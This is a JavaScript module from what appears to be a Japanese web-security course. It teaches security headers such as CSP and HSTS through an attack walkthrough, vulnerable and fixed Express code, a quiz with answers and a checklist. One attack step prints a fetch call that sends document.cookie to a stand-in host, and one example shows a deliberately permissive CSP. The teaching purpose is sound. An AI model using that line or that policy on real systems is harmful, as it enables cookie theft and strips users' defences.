/**
 * トピック10: セキュリティヘッダー（CSP等）
 * カテゴリ: 設定ミス
 *
 * 本トピックはCSPの詳細解説として、01（XSS）・07（CSRF）・11（クリックジャッキング）から参照される中核。
 */
registerTopic({
  id: 10,
  category: "設定ミス",
  title: "セキュリティヘッダー（CSP等）",
  summary: "CSP・HSTS・X-Content-Type-Optionsなどの未設定・誤設定で防御が効かない問題。",
  keywords: [
    "セキュリティヘッダー",
    "CSP",
    "Content-Security-Policy",
    "HSTS",
    "Strict-Transport-Security",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "frame-ancestors",
    "nonce",
    "helmet",
    "多層防御",
  ],

  // 概要（HTML、400〜800字程度）
  overview: [
    "<p>セキュリティヘッダーとは、サーバーがHTTPレスポンスに付ける<strong>ブラウザ向けの指示</strong>です。",
    "「このページではインラインスクリプトを実行しないで」「今後はHTTPSでしか接続しないで」といった約束をブラウザに守らせ、",
    "アプリ本体の対策が破られたときの<strong>最後の砦（多層防御）</strong>として働きます。",
    "設定は数行ですが、未設定や誤設定だと、せっかくの防御機構が丸ごと無効のまま放置されます。</p>",
    "<p>中でも重要なのが<strong>CSP（Content-Security-Policy）</strong>です。",
    "CSPは<strong>スクリプトや画像などを、どの読み込み元（オリジン）から実行・取得してよいかをブラウザに制限させる</strong>ヘッダーで、",
    "XSS（トピック01）が仮に成立しても、外部への情報送信やインラインスクリプトの実行を止められる可能性があります。",
    "たとえば<code>script-src 'self'</code>とすれば、自サイト由来のスクリプトしか実行されず、",
    "攻撃者が注入した<code>&lt;script&gt;</code>やインラインの<code>onerror</code>は動きません。</p>",
    "<p>主なヘッダーは次のとおりです。",
    "<ul>",
    "<li><strong>Content-Security-Policy</strong>: スクリプト等の読み込み元を制限（XSSの緩和）。<code>frame-ancestors</code>でクリックジャッキング（トピック11）も防ぐ。</li>",
    "<li><strong>Strict-Transport-Security（HSTS）</strong>: 以後の接続を常にHTTPSへ強制し、盗聴や中間者攻撃を防ぐ。</li>",
    "<li><strong>X-Content-Type-Options: nosniff</strong>: ブラウザが勝手にMIMEタイプを推測（sniffing）するのを止め、なりすまし実行を防ぐ。</li>",
    "<li><strong>Referrer-Policy</strong>: 遷移時に送るリファラ情報を絞り、URLに含まれる機密の漏れを抑える。</li>",
    "</ul>",
    "根本原因は多くの場合「知らずに未設定」か「コピペした緩いポリシーの放置」です。",
    "とくにCSPで<code>'unsafe-inline'</code>を安易に許すと、XSS対策としての効果が大きく損なわれます。</p>",
  ].join(""),

  // 攻撃の仕組み（攻撃者視点の番号付きステップ）
  attack: {
    scenario: "<p>セキュリティヘッダーが未設定・誤設定のサイトで、攻撃がどこまで通ってしまうかを見ます（防御を理解するための説明です）。</p>",
    steps: [
      {
        title: "レスポンスヘッダーを確認して防御の有無を調べる",
        detail: "<p>攻撃者は開発者ツールやコマンドでレスポンスヘッダーを見ます。" +
          "<code>Content-Security-Policy</code>や<code>Strict-Transport-Security</code>が無ければ、" +
          "ブラウザ側の防御が働いていないと判断できます。</p>",
      },
      {
        title: "CSP未設定ならXSSの被害を最大化する",
        detail: "<p>CSPが無いと、XSS（トピック01）で注入したスクリプトは何の制限も受けません。" +
          "攻撃者は<code>fetch('https://evil.example/c?d='+document.cookie)</code>のようなコードで、" +
          "盗んだ情報を自由に外部へ送信できます。</p>",
      },
      {
        title: "HSTS未設定なら通信を平文に落として盗聴する",
        detail: "<p>HSTSが無いと、初回アクセスや<code>http://</code>リンク経由の接続がHTTPSに強制されません。" +
          "公衆Wi-Fiなどで中間者攻撃を仕掛け、平文通信からセッションクッキーを盗む余地が生まれます。</p>",
      },
      {
        title: "nosniff未設定ならMIME推測を悪用する",
        detail: "<p><code>X-Content-Type-Options: nosniff</code>が無いと、ブラウザが中身を見てMIMEタイプを推測します。" +
          "アップロード機能などで、画像やテキストに見せかけたファイルをブラウザにスクリプトとして解釈させる隙を作れます。</p>",
      },
      {
        title: "CSPがあっても緩ければすり抜ける",
        detail: "<p>CSPが設定されていても<code>script-src 'unsafe-inline'</code>や<code>script-src *</code>のように緩いと、" +
          "インラインスクリプトや任意ドメインからの読み込みが通り、CSPの意味がほぼ失われます。攻撃者はこの緩さを突きます。</p>",
      },
    ],
    note: "<p>セキュリティヘッダーは<strong>それ単体で脆弱性を根治するものではなく、多層防御の一枚</strong>です。" +
      "XSSは出力エスケープ（トピック01）で塞ぎ、CSPはそれが破られたときの保険にします。" +
      "「ヘッダーを付けたから安全」ではなく、アプリ本体の対策と組み合わせて初めて効果を発揮します。</p>",
  },

  // 脆弱／修正コードの比較
  codeComparison: [
    {
      title: "サーバー側：セキュリティヘッダーの付与（helmet）",
      lang: "JavaScript (Node.js / Express, helmet)",
      description: "ヘッダー未設定の状態と、helmetで主要ヘッダーをまとめて付ける状態を比べます。",
      vulnerable: {
        label: "脆弱なコード",
        code: [
          "const express = require('express');",
          "const app = express();",
          "",
          "// セキュリティヘッダーを一切付けていない",
          "app.get('/', (req, res) => {",
          "  res.send(renderPage());",
          "});",
        ].join("\n"),
        highlights: [4, 6],
        note: "<p>CSPもHSTSもnosniffも無いため、XSSの被害拡大・平文通信への降格・MIME推測などをブラウザ側で止められません。" +
          "「特に何も設定していない」状態が、そのまま多層防御の欠如になっています。</p>",
      },
      fixed: {
        label: "修正したコード",
        code: [
          "const express = require('express');",
          "const helmet = require('helmet');",
          "const app = express();",
          "",
          "app.use(helmet()); // 主要なセキュリティヘッダーを既定値で付与",
          "app.use(helmet.strictTransportSecurity({",
          "  maxAge: 15552000, // 180日。HTTPS強制",
          "}));",
          "",
          "app.get('/', (req, res) => {",
          "  res.send(renderPage());",
          "});",
        ].join("\n"),
        highlights: [2, 5, 6, 7, 8],
        note: "<p><code>helmet()</code>は<code>X-Content-Type-Options: nosniff</code>やCSPなど主要ヘッダーをまとめて付けます。" +
          "HSTSは全サブドメインにHTTPSを強制でき影響が大きいため、まず短い<code>maxAge</code>で始めて段階的に延ばすのが安全です。" +
          "CSPの中身は次の比較で具体化します。</p>",
      },
    },
    {
      title: "CSPディレクティブの実用的な組み方",
      lang: "HTTPヘッダー / JavaScript (Node.js)",
      description: "ありがちな緩いCSPと、nonceでインラインを安全に許す実用的なCSPを比べます。",
      vulnerable: {
        label: "脆弱なコード",
        code: [
          "// 何でも許してしまう緩いCSP（実質ほぼ無効）",
          "res.header(",
          "  'Content-Security-Policy',",
          "  \"default-src *; script-src * 'unsafe-inline' 'unsafe-eval'\"",
          ");",
        ].join("\n"),
        highlights: [4],
        note: "<p><code>script-src *</code>は任意ドメインのスクリプトを許可し、" +
          "<code>'unsafe-inline'</code>は注入されたインラインスクリプトの実行を許します。" +
          "<code>'unsafe-eval'</code>も<code>eval</code>を解禁するため、XSSの緩和というCSP本来の効果がほぼ消えます。</p>",
      },
      fixed: {
        label: "修正したコード",
        code: [
          "app.use((req, res, next) => {",
          "  // リクエストごとに推測不能なnonceを生成",
          "  res.locals.nonce = require('crypto').randomBytes(16).toString('base64');",
          "  res.header('Content-Security-Policy', [",
          "    \"default-src 'self'\",",
          "    `script-src 'self' 'nonce-${res.locals.nonce}'`,",
          "    \"object-src 'none'\",",
          "    \"base-uri 'self'\",",
          "    \"frame-ancestors 'none'\",",
          "  ].join('; '));",
          "  next();",
          "});",
          "// テンプレート側: <script nonce=\"{{nonce}}\">...</script>",
        ].join("\n"),
        highlights: [3, 5, 6, 7, 8, 9],
        note: "<p><code>default-src 'self'</code>で既定を自サイトに限定し、インラインは" +
          "リクエストごとの<strong>nonce（一度きりの乱数）</strong>を付けたものだけ許します。" +
          "攻撃者はnonce値を知り得ないため、注入スクリプトは実行できません。" +
          "<code>object-src 'none'</code>や<code>base-uri 'self'</code>で回避経路も塞ぎ、" +
          "<code>frame-ancestors 'none'</code>はクリックジャッキング（トピック11）対策を兼ねます。" +
          "導入時は<code>Content-Security-Policy-Report-Only</code>で違反を観測してから本適用すると安全です。</p>",
      },
    },
  ],

  // 4択クイズ（3問）
  quiz: [
    {
      question: "Content-Security-Policy（CSP）がXSS対策として果たす役割の説明として最も適切なものはどれですか。",
      choices: [
        "サーバー側の出力エスケープを不要にする根本対策である",
        "スクリプトの読み込み元や実行を制限し、XSSが成立しても被害を抑える多層防御の一枚である",
        "通信を暗号化してXSSを防ぐ",
        "入力値を自動でサニタイズしてくれる",
      ],
      answerIndex: 1,
      explanation: "<p>CSPはスクリプトの読み込み元・実行を制限し、万一XSSが成立しても外部送信やインライン実行を止める多層防御です。" +
        "出力エスケープ（トピック01）という根本対策を置き換えるものではなく、その保険という位置づけです。" +
        "通信暗号化はHTTPS、入力サニタイズはアプリ側の処理であり、いずれもCSPの役割ではありません。</p>",
    },
    {
      question: "CSPの<code>script-src</code>に含めると、XSS緩和の効果を大きく損なう指定はどれですか。",
      choices: [
        "'self'",
        "'nonce-...'（リクエストごとの乱数）",
        "'unsafe-inline'",
        "特定の信頼できる配信元ドメイン",
      ],
      answerIndex: 2,
      explanation: "<p><code>'unsafe-inline'</code>はインラインスクリプトの実行を許すため、" +
        "攻撃者が注入した<code>onerror</code>やインライン<code>&lt;script&gt;</code>まで動いてしまい、CSPの意味がほぼ失われます。" +
        "<code>'self'</code>・信頼できる配信元・リクエストごとの<code>nonce</code>は、実行元を安全に絞るための適切な指定です。</p>",
    },
    {
      question: "HSTS（Strict-Transport-Security）を導入する際の注意点として正しいものはどれですか。",
      choices: [
        "maxAgeは最初から最大値かつ全サブドメインへ一気に適用するのが安全",
        "サブドメインを含めHTTPSが確実に整うまでは短いmaxAgeから始め、段階的に延ばすのが安全",
        "HSTSを付ければCSPは不要になる",
        "HSTSは平文HTTPでの初回アクセス時にも過去の設定なしで必ず効く",
      ],
      answerIndex: 1,
      explanation: "<p>HSTSは一度受け取るとブラウザが期間中HTTPSを強制し、途中でHTTPに戻せなくなります。" +
        "サブドメインまで一気に長期間強制すると、HTTPS未対応の資産が全て閉め出される事故になり得るため、" +
        "短いmaxAgeから段階的に延ばすのが安全です。CSPとは目的が別で代替関係になく、" +
        "初回の平文アクセスは事前設定（プリロード等）が無い限り保護対象外です。</p>",
    },
  ],

  // 実務チェックリスト（5〜8項目）
  checklist: [
    "<code>Content-Security-Policy</code>を設定し、<code>default-src 'self'</code>を基点にスクリプト等の読み込み元を絞っている",
    "<code>script-src</code>で<code>'unsafe-inline'</code>や<code>'unsafe-eval'</code>を安易に許可せず、必要なインラインはnonceまたはハッシュで限定している",
    "<code>frame-ancestors</code>を設定し、クリックジャッキング（トピック11）を防いでいる",
    "<code>Strict-Transport-Security</code>（HSTS）を設定し、短い<code>maxAge</code>から段階的に延ばして運用している",
    "<code>X-Content-Type-Options: nosniff</code>を付け、ブラウザのMIME推測を無効化している",
    "<code>Referrer-Policy</code>を設定し、URLに含まれる機密が外部サイトへ漏れないよう制御している",
    "CSPは<code>Content-Security-Policy-Report-Only</code>で違反を観測してから本適用し、正規スクリプトの巻き込みを防いでいる",
    "ヘッダーは多層防御と理解し、XSS（出力エスケープ）など本体側の対策と併用している",
  ],

  // 参考資料（公式・一次情報。実在する定番URLのみ）
  references: [
    { title: "MDN: Content Security Policy (CSP)", url: "https://developer.mozilla.org/ja/docs/Web/HTTP/Guides/CSP", note: "CSPの考え方とディレクティブ（日本語）" },
    { title: "MDN: Strict-Transport-Security", url: "https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security", note: "HSTSヘッダーの仕様と注意点（日本語）" },
    { title: "MDN: X-Content-Type-Options", url: "https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options", note: "nosniffの効果（日本語）" },
    { title: "W3C: Content Security Policy Level 3", url: "https://www.w3.org/TR/CSP3/", note: "CSPの一次仕様（英語）" },
    { title: "web.dev: Mitigate XSS with a strict CSP", url: "https://web.dev/articles/strict-csp", note: "nonceベースの厳格なCSP実装（英語）" },
    { title: "OWASP Secure Headers Project", url: "https://owasp.org/www-project-secure-headers/", note: "推奨ヘッダーの一覧と設定例（英語）" },
    { title: "helmet（Express用ヘッダーミドルウェア）", url: "https://helmetjs.github.io/", note: "主要ヘッダーをまとめて付ける定番ライブラリ（英語）" },
  ],
});
